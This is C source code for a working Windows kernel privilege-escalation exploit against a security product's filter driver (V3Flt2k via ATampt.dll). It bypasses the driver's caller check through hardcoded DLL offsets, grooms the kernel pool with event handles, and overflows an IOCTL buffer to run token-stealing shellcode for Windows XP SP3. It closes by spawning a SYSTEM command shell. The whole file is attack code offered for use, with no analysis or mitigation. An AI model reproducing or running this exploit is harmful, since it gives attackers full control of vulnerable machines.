#include <Windows.h>
#include <stdio.h>

#define OVERFLOW_SIZE 0x816
#define IOCTLCODE 0xA337085C

typedef struct ARGUMENTS
{
	HANDLE handle; //+0
	BYTE * buffer; //+4
	DWORD unused0; //+8
	DWORD unused1; //+C
	DWORD unused3; //+10
	DWORD unused4; //+10
	BYTE * buffer2; //+14
}ARGS;

typedef DWORD (*TypeAuthorize)(ARGS * a1);
typedef DWORD (WINAPI *TypeSecureIoControl)(ARGS * a1, BOOL someFlag, DWORD dwIoControlCode, BYTE * realInput, 
	size_t Size, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);


HMODULE GetLibraryA(CHAR * libName)
{
	HMODULE hmd = NULL;
	hmd = GetModuleHandleA(libName);
	if(hmd == NULL)
	{
		hmd = LoadLibraryA(libName);		
	}
	return hmd;
}

DWORD BypassSecurityFilter(ARGS * args)
{
	HMODULE hmd = GetLibraryA("ATampt.dll");
	if(hmd == NULL)
		return GetLastError();
	TypeAuthorize Authorize = (TypeAuthorize)((DWORD)hmd+0x68A6);
	return Authorize(args);
}

DWORD IoControl(ARGS * args, DWORD dwIoControlCode, BYTE *realInput, 
	size_t Size, LPVOID lpOutBuffer, DWORD nOutBufferSize)
{
	HMODULE hmd = GetLibraryA("ATampt.dll");
	if(hmd == NULL)
		return GetLastError();
	TypeSecureIoControl SecureIoControl = (TypeSecureIoControl)((DWORD)hmd+0x6BC9);
	DWORD BytesReturned = 0;
	return SecureIoControl(args, TRUE, dwIoControlCode, realInput, Size, lpOutBuffer, nOutBufferSize,
		&BytesReturned, NULL);
}


//Offsets of Data structures WINXPSP3
#define _KPROCESS 0x44
#define _TOKEN 0xc8
#define _UPID 0x84
#define _APLINKS 0x88

VOID SHELLCODE()
{
	__asm
	{
		push edx                        
		push ebx                        
		xor eax, eax                    
		mov eax, fs:[eax+124h]
		mov eax, [eax+_KPROCESS]    
		mov ecx, eax
		mov ebx, [eax+_TOKEN]   
L:		mov eax, [eax+_APLINKS] 
		sub eax,88h                     
		cmp [eax+_UPID], 4      
		jnz L
		mov edx,[eax+_TOKEN]    
		mov eax, ecx                    
		mov [eax+_TOKEN],edx    
		pop ebx                         
		pop edx                  
	}
}

int main()
{
	
	int i;
	for(i = 0 ; i < 0x100000 ; i++)
		CreateEvent(NULL, FALSE, FALSE, NULL);	

	HANDLE hArr[0x10000];		
	for(i = 0 ; i < 0x10000 ; i++)
		hArr[i] = CreateEvent(NULL, FALSE, FALSE, NULL);

	for(i = 0 ; i < 0xf000 ; i+=0x200)
		for(int j = 0; j < 0x2b; j++)
			CloseHandle(hArr[i+j]);

	HANDLE handle = INVALID_HANDLE_VALUE;
	handle = CreateFileA("\\\\.\\V3Flt2k", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 
		NULL, OPEN_EXISTING,  FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, 0);
	if (handle == INVALID_HANDLE_VALUE)
		return -1;
	else
	{
		ARGS * args = new ARGS();
		args->handle = handle;
		args->buffer =  new BYTE[0x10];
		ZeroMemory(args->buffer, 0x10);
		args->buffer2 = new BYTE[0x10];
		ZeroMemory(args->buffer2, 0x10);
		
		if(!BypassSecurityFilter(args))
		{
			BYTE fake[0x190];
			memset(fake, 0, 0x190);
			*(DWORD*)(fake+0xA8) = (DWORD)SHELLCODE;			
			BYTE input[OVERFLOW_SIZE];
			memset(input, 0x45, OVERFLOW_SIZE);
			input[0x800] = 0x01;
			input[0x801] = 0x01;
			input[0x802] = 0x06;
			input[0x803] = 0x0A;
 			*(DWORD*)(input+0x804) = 0xee657645;
			*(DWORD*)(input+0x808) = 0xdeadfa11;
			*(DWORD*)(input+0x80C) = 0xcafebabe;
			*(DWORD*)(input+0x810) = (DWORD)&fake;
			*(WORD*)(input+OVERFLOW_SIZE-2) = NULL;
			char output[0x40];
			DWORD status = IoControl(args, IOCTLCODE, input, sizeof(input), output, sizeof(output));					
		}		

		for(i = 0 ; i < 0x10000 ; i++)
		{
			CloseHandle(hArr[i]);
		}		
		CloseHandle(handle);
	}
	printf("Enjoy your system shell ;)\n\n");
	WinExec("CMD", SW_SHOWNORMAL);
}
